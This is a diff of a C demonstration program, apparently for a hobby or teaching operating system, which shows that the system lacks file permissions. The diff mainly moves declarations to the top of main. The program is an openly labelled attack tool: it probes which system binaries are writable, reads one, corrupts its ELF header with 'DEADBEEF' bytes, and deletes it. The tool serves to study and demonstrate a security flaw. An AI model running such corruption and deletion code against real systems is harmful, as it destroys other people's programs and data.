@@ -25,11 +25,19 @@
 
 #include "stdio.h"
 #include "string.h"
+#include "proto.h"
 
 int main(int argc, char *argv[])
 {
-	int mode = 0;
-	char *target = "/echo";  /* 默认攻击目标 */
+	int mode;
+	char *target;
+	int fd, n, ret, i, count;
+	char buf[128];
+	char poison[9];
+	char *targets[16];
+	
+	mode = 0;
+	target = "/echo";
 	
 	printf("\n");
 	printf("=============================================\n");
@@ -55,17 +63,25 @@ int main(int argc, char *argv[])
 		/* 信息收集：尝试打开各种文件 */
 		printf("=== Mode 0: Information Gathering ===\n\n");
 		
-		char *targets[] = {
-			"/dev_tty0", "/dev_tty1", "/dev_tty2",
-			"/cmd.tar", "/echo", "/pwd", "/ps", 
-			"/kill", "/ls", "/touch", "/rm",
-			"/cat", "/editor", "/logman", 0
-		};
+		targets[0] = "/dev_tty0";
+		targets[1] = "/dev_tty1";
+		targets[2] = "/dev_tty2";
+		targets[3] = "/cmd.tar";
+		targets[4] = "/echo";
+		targets[5] = "/pwd";
+		targets[6] = "/ps";
+		targets[7] = "/kill";
+		targets[8] = "/ls";
+		targets[9] = "/touch";
+		targets[10] = "/rm";
+		targets[11] = "/cat";
+		targets[12] = "/editor";
+		targets[13] = "/logman";
+		targets[14] = 0;
 		
-		int i;
-		int count = 0;
+		count = 0;
 		for (i = 0; targets[i] != 0; i++) {
-			int fd = open(targets[i], O_RDWR);
+			fd = open(targets[i], O_RDWR);
 			if (fd >= 0) {
 				printf("[+] %-12s WRITABLE (fd=%d)\n", targets[i], fd);
 				close(fd);
@@ -83,14 +99,13 @@ int main(int argc, char *argv[])
 		/* 读取攻击：读取可执行文件内容 */
 		printf("=== Mode 1: Read Attack ===\n\n");
 		
-		int fd = open(target, O_RDWR);
+		fd = open(target, O_RDWR);
 		if (fd < 0) {
 			printf("[-] Failed to open %s\n", target);
 			return 1;
 		}
 		
-		char buf[128];
-		int n = read(fd, buf, sizeof(buf));
+		n = read(fd, buf, sizeof(buf));
 		close(fd);
 		
 		if (n > 0) {
@@ -98,7 +113,6 @@ int main(int argc, char *argv[])
 			
 			/* 十六进制显示 */
 			printf("Hex dump:\n");
-			int i;
 			for (i = 0; i < n && i < 64; i++) {
 				printf("%02x ", (unsigned char)buf[i]);
 				if ((i + 1) % 16 == 0) printf("\n");
@@ -119,15 +133,14 @@ int main(int argc, char *argv[])
 		/* 篡改攻击：破坏可执行文件 */
 		printf("=== Mode 2: Corruption Attack ===\n\n");
 		
-		int fd = open(target, O_RDWR);
+		fd = open(target, O_RDWR);
 		if (fd < 0) {
 			printf("[-] Failed to open %s\n", target);
 			return 1;
 		}
 		
 		/* 读取原始 ELF 头 */
-		char buf[16];
-		int n = read(fd, buf, 16);
+		n = read(fd, buf, 16);
 		if (n < 16) {
 			printf("[-] Failed to read file header\n");
 			close(fd);
@@ -135,7 +148,6 @@ int main(int argc, char *argv[])
 		}
 		
 		printf("[*] Original header: ");
-		int i;
 		for (i = 0; i < 8; i++) {
 			printf("%02x ", (unsigned char)buf[i]);
 		}
@@ -146,15 +158,15 @@ int main(int argc, char *argv[])
 		fd = open(target, O_RDWR);
 		
 		/* 破坏 ELF 魔数 - 将 0x7f ELF 改为 DEAD */
-		char poison[] = "DEADBEEF";
+		strcpy(poison, "DEADBEEF");
 		n = write(fd, poison, 8);
 		close(fd);
 		
 		if (n == 8) {
 			printf("[+] Wrote 8 bytes of poison data!\n");
-			printf("[+] New header: 44 45 41 44 42 45 45 46 (DEADBEEF)\n");
+			printf("[+] New header: 44 45 41 44 42 45 45 46\n");
 			printf("\n[!] File %s is now CORRUPTED!\n", target);
-			printf("[!] Try running it: the system will fail to execute.\n");
+			printf("[!] Try running it - execution will fail.\n");
 		} else {
 			printf("[-] Write failed (wrote %d bytes)\n", n);
 		}
@@ -165,16 +177,16 @@ int main(int argc, char *argv[])
 		printf("=== Mode 3: Delete Attack ===\n\n");
 		
 		/* 先确认文件存在 */
-		int fd = open(target, O_RDWR);
+		fd = open(target, O_RDWR);
 		if (fd < 0) {
 			printf("[-] File %s not found\n", target);
 			return 1;
 		}
 		close(fd);
 		
-		printf("[*] File %s exists, attempting deletion...\n", target);
+		printf("[*] File %s exists, deleting...\n", target);
 		
-		int ret = unlink(target);
+		ret = unlink(target);
 		
 		if (ret == 0) {
 			printf("[+] Successfully DELETED %s!\n", target);
@@ -188,7 +200,7 @@ int main(int argc, char *argv[])
 	printf("\n");
 	printf("=== Structural Vulnerability Summary ===\n");
 	printf("1. No user ID / ownership model\n");
-	printf("2. No file permission bits (rwx)\n");  
+	printf("2. No file permission bits (rwx)\n");
 	printf("3. No access control in FS operations\n");
 	printf("4. Any process can tamper with any file\n");
 	printf("\n");
